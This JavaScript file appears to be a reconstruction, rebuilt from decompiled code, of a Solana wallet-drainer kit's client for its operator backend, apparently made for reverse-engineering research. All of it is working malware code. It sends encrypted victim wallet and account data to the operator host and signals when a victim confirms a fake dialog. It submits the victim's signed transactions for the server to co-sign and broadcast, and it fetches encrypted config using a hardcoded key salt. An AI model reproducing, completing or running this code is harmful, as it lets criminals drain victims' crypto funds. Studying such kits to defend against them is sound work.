/**
 * rebuilt/operator/client.js
 *
 * OperatorClient — all HTTP calls to the operator backend.
 * Original class: 听. Singleton instance: 夾.
 *
 * Sources:
 *   - decompiled/kit/operator/operator_api.js
 *   - bundle.deobfuscated.js lines 20675–20760 (class 听 + private methods)
 *   - GAP_CLOSURE_2026-11-14.md (/c/i, /c/c, /c/f, /process layouts)
 *   - decompiled/live/endpoint_surface_2026-11-12.json
 *
 * Base URL: https://{config.Se}/api{path}
 * POST encoding:
 *   Uint8Array body → base64 (toBase64), content-type: text/plain
 *   plain object   → JSON.stringify, content-type: application/json
 */

'use strict';

const { aesEncrypt } = require('../core/crypto');
const { buildConnectPayload, buildProcessPayload } = require('./payloads');

class StatusError extends Error {
  constructor(status) {
    super('HTTP ' + status);
    this.status = status;
  }
}

/**
 * operatorUrl(apiHost, path):
 *   "https://" + apiHost + "/api" + path
 */
function operatorUrl(apiHost, path) {
  return 'https://' + apiHost + '/api' + path;
}

// ── GET helper (饱) ──────────────────────────────────────────────────────
// Called by locales() and isBanned(). Accepts an optional query params object.
// Timeout: 2500 ms.
async function operatorGet(apiHost, path, params, timeoutMs = 2500) {
  if (params) path += '?' + new URLSearchParams(params);
  const response = await fetch(operatorUrl(apiHost, path), {
    signal: AbortSignal.timeout(timeoutMs),
  });
  if (!response.ok) throw new StatusError(response.status);
  return response;
}

// ── POST helper (壩) ─────────────────────────────────────────────────────
// Uint8Array → base64 text/plain; anything else → JSON application/json.
async function operatorPost(apiHost, path, body, timeoutMs = 1000) {
  let payload, contentType;
  if (body instanceof Uint8Array) {
    payload     = Buffer.from(body).toString('base64');
    contentType = 'text/plain';
  } else {
    payload     = JSON.stringify(body);
    contentType = 'application/json';
  }
  return fetch(operatorUrl(apiHost, path), {
    method:  'POST',
    headers: { 'content-type': contentType },
    signal:  AbortSignal.timeout(timeoutMs),
    body:    payload,
  });
}

// ── Retry wrapper (zt) ───────────────────────────────────────────────────
// Wraps a function call with backoff: on HTTP 400 or 500 errors, throws
// immediately; on network errors, retries up to `tries` times sleeping
// base * attempt ms between attempts.
async function withRetry(fn, tries = 5, baseMs = 250) {
  let lastErr;
  for (let i = 0; i < tries; i++) {
    try {
      return await fn();
    } catch (err) {
      if (err instanceof StatusError && [400, 500].includes(err.status)) throw err;
      lastErr = err;
      if (i < tries - 1) await sleep(baseMs * i);
    }
  }
  throw lastErr;
}

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

// ── API methods ───────────────────────────────────────────────────────────

/**
 * GET /api/locales?lang={lang}
 * Returns 10-element JSON array of localized UI strings.
 * Never called by the client bundle at runtime (server tooling only).
 * 14 languages confirmed live 2026-11-12: en, fr, zh, de, es, pt, it,
 * ja, ko, ar, tr, pl, vi, id. Russian (ru) returns 404.
 */
async function fetchLocales(apiHost, lang) {
  const response = await operatorGet(apiHost, '/locales?lang=' + lang);
  return response.json();
}

/**
 * GET /api/is-banned
 * Returns "1" (banned) or "0" (not banned).
 * Per-visitor IP/ASN blocklist check. Datacenter CIDRs → banned.
 */
async function isBanned(apiHost) {
  const response = await operatorGet(apiHost, '/is-banned');
  return (await response.text()) === '1';
}

/**
 * GET /api/config  (optionally /api/config?tgid=N)
 * Returns 188-byte (or 220-byte v2) AES-GCM blob.
 * Key = SHA-256(apiHost + "B3ui3QZFrOPoGW7oMZgE4A")
 * NEW (confirmed by deobfuscation): accepts ?tgid=N (Telegram user ID)
 *   to allow server to serve per-user config overrides.
 * Response is cached to localStorage["_0x12"] as base64.
 * On return visits, 菣() reads the cache and skips the network call.
 * Retries with exponential backoff (ho() method in 歅 class):
 *   attempt * 250 ms, up to 10 attempts, then 2500 ms fixed.
 */
async function fetchConfig(apiHost, tgid = null) {
  const path = '/config' + (tgid ? '?tgid=' + tgid : '');
  const url = 'https://' + apiHost + '/api' + path;

  const response = await fetch(url, {
    signal:  AbortSignal.timeout(3000),
    headers: { 'content-language': 'en-US,q=0.8;en' },  // header sent by the bundle
  });
  if (!response.ok) throw new Error(response.statusText);

  const rawBlob = new Uint8Array(await response.arrayBuffer());
  return rawBlob; // caller decrypts with aesDecrypt(rawBlob, apiHost)
}

/**
 * POST /api/process
 * Submit signed transactions. Server adds co-signatures (treasury + receiver)
 * and broadcasts. Timeout: 2500 ms.
 *
 * Body format: buildProcessPayload() → base64 text/plain
 * Server response: 2xx = accepted; 4xx/5xx = StatusError
 *
 * The kit also self-broadcasts 2500 ms after this call (broadcastSigned in submit.js),
 * so the operator POST wins the race with a 2.5s head start.
 */
async function submitProcess(apiHost, victimPubkey, attemptCounter, signedTxs, flowByte, accountAddresses) {
  const body = buildProcessPayload(victimPubkey, attemptCounter, signedTxs, flowByte, accountAddresses);
  const response = await operatorPost(apiHost, '/process', body, 2500);
  if (!response.ok) throw new StatusError(response.status);
}

/**
 * POST /api/c/i   — connect notification
 * Sends encrypted victim wallet info. Returns session ID + optional decoy config.
 * Timeout: 16000 ms (16 seconds — server builds the decoy legs).
 *
 * Request body: AES-GCM(buildConnectPayload(...), apiHost + "c")  → base64 text/plain
 *
 * Response (binary, NOT encrypted):
 *   bytes 0–10:   11 bytes  opaque header (session nonce)
 *   bytes 11–12:  u16 LE    field A = session ID
 *   byte  13:     u8        field C = flow modifier
 *   byte  14:     u8        flag (0 = no keyed entry)
 *   if flag != 0:
 *     bytes 15–46: 32 bytes  pubkey (map key)
 *     bytes 47–48: u16 LE    string length
 *     bytes 49–N:  UTF-8     comma-separated value
 *
 * Returns: [sessionId, optionalKeyedEntry, flowModifier]
 *   optionalKeyedEntry = { [pubkey]: [csv_values] } or undefined
 */
async function notifyConnect(apiHost, victimPubkey, solAmountLamports, accountEntries) {
  const plaintext = buildConnectPayload(victimPubkey, solAmountLamports, accountEntries);
  const encrypted = await aesEncrypt(plaintext, apiHost + 'c');
  const response  = await operatorPost(apiHost, '/c/i', encrypted, 16000);
  if (!response.ok) throw new StatusError(response.status);

  const buffer = new Uint8Array(await response.arrayBuffer());
  return parseConnectResponse(buffer);
}

/**
 * parseConnectResponse(buffer):
 *   Parse the binary /c/i response (籮() in bundle).
 *   Returns [sessionId, keyedEntry|undefined, flowModifier]
 */
function parseConnectResponse(buffer) {
  if (buffer.length < 15) return [buffer[11] | (buffer[12] << 8), undefined, buffer[13]];

  let offset = 11;
  const sessionId     = buffer[offset] | (buffer[offset + 1] << 8); offset += 2;
  const flowModifier  = buffer[offset++];
  const hasKeyedEntry = buffer[offset++];

  if (!hasKeyedEntry) {
    return [sessionId, undefined, flowModifier];
  }

  // Read 32-byte pubkey key
  const { base58Encode } = require('../core/crypto');
  const keyBytes = buffer.slice(offset, offset + 32); offset += 32;
  const keyPubkey = base58Encode(keyBytes);

  // Read length-prefixed UTF-8 CSV value
  const strLen = buffer[offset] | (buffer[offset + 1] << 8); offset += 2;
  const csv    = new TextDecoder().decode(buffer.slice(offset, offset + strLen));

  const keyed = { [keyPubkey]: csv.split(',') };
  return [sessionId, keyed, flowModifier];
}

/**
 * POST /api/c/c/{sessionId}/{counter}   — confirm notification
 * Fires when victim clicks "Confirm" in the fake dialog.
 * Body: empty JSON {}
 * Timeout: 16000 ms
 * No meaningful response body.
 */
async function notifyConfirm(apiHost, sessionId, counter) {
  const response = await operatorPost(
    apiHost, '/c/c/' + sessionId + '/' + counter, {}, 16000
  );
  if (!response.ok) throw new StatusError(response.status);
}

/**
 * POST /api/c/f/{sessionId}   — final notification
 * Fires after transactions are submitted.
 * Body: packByteArrays(accountList) → base64 text/plain
 * Timeout: 2500 ms
 */
async function notifyFinal(apiHost, sessionId, accountList) {
  const { packByteArrays } = require('../core/crypto');
  const body     = packByteArrays(accountList);
  const response = await operatorPost(apiHost, '/c/f/' + sessionId, body, 2500);
  if (!response.ok) throw new StatusError(response.status);
}

module.exports = {
  StatusError,
  operatorUrl,
  operatorGet,
  operatorPost,
  withRetry,
  fetchLocales,
  isBanned,
  fetchConfig,
  submitProcess,
  notifyConnect,
  parseConnectResponse,
  notifyConfirm,
  notifyFinal,
};
